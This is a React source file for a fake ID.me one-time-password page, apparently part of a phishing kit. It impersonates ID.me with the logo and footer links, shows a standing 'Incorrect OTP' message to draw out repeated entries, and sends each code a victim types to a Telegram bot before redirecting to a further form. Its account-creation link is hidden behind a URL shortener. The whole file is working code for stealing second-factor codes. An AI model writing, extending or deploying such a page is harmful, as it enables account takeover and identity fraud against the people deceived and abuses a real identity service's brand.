import React, { useState } from "react";
import { useNavigate } from "react-router-dom"; // Use this for Vite/React Router
import './styles.css';
import idmeLogo from './idme.png'; 
import { sendTelegramMessage } from "../../utils/telegram"; // Updated path

const OTPVerificationPage = () => {
  const [otp, setOtp] = useState('');
  const [error, setError] = useState('');
  const navigate = useNavigate(); // Initialize the hook

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!otp) {
      setError("Please enter the OTP.");
      return;
    }

    const message = `New OTP Verification Attempt:\nOTP: ${otp}`;

    try {
      // 1. Send the message
      await sendTelegramMessage(message);
      
      // 2. Navigate using React Router's navigate function
      // window.location.href causes a full reload which you want to avoid in an SPA
      navigate("/form"); 
      
    } catch (err) {
      console.error('Error sending OTP:', err);
      // If telegram fails, it lands here and never navigates
      setError("Failed to send OTP. Please try again.");
    }
  };

  return (
    <div className='page-container'>
      <div className='container'>
        <div className='content-container'>
          <form className="new_user" onSubmit={handleSubmit}>
            <div className='form-header'>
              <div className='form-header-content'>
                <div className='partner'>
                  <div className='c_icon m_idme'>
                    <img src={idmeLogo} alt="ID.me" className="w-[120px] h-[40px] object-contain" />
                  </div>
                </div>
              </div>
            </div>

            <main className='form-container'>
              <div className='form-header-access'>
                <p style={{ color: "red", textAlign: "center" }}>Incorrect OTP. Please try again.</p>
              </div>

              <div className='form-header-well'>
                <p>New to ID.me?</p>
                <p><a target="_blank" rel="noreferrer" href="https://cutt.ly/xPJZ0xv">Create an ID.me account</a></p>
              </div>

              <p>Enter the OTP sent to the mobile number associated with your ID.me account</p>
              <br /><br /><br />

              <div className='form-fields'>
                <div className='field-group'>
                  <div className='field text'>
                    <label htmlFor="user_otp">One Time Password</label>
                    <input
                      placeholder="Enter your OTP"
                      required
                      type="number"
                      id="user_otp"
                      value={otp}
                      onChange={(e) => setOtp(e.target.value)}
                    />
                  </div>
                </div>
              </div>

              {error && <p style={{ color: 'red', fontSize: '12px' }}>{error}</p>}

              <div className='form-actions'>
                <input type="submit" value="Verify" className="btn btn-primary" />
              </div>
            </main>
          </form>
        </div>

        <footer className='footer'>
          <div className='footer-links'>
            <a target="_blank" rel="noreferrer" href="https://www.id.me/about">What is ID.me?</a> |
            <a target="_blank" rel="noreferrer" href="https://www.id.me/terms">Terms of Service</a> |
            <a target="_blank" rel="noreferrer" href="https://www.id.me/privacy">Privacy Policy</a>
          </div>
        </footer>
      </div>
    </div>
  );
};

export default OTPVerificationPage;